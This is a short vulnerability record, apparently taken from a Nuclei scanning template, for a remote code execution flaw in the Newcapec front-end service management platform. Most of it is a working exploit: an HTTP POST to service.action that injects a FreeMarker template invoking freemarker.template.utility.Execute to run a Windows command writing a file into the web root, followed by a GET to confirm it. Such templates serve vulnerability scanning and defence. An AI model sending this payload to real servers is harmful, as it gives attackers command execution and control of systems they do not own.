# Vulnerability: Newcapec - Remote Code Execution
**Classification:** NEWCAPEC
**Source:** Nuclei Template (`newcapec-rce.yaml`)

## Description
Newcapec front-end service management platform service.action interface has a remote command execution vulnerability, attackers can use the vulnerability to obtain server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 30s
POST /service_transport/service.action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo {{data}} > ./webapps/ROOT/{{file}}.txt\")}"}

GET /{{file}}.txt HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
```

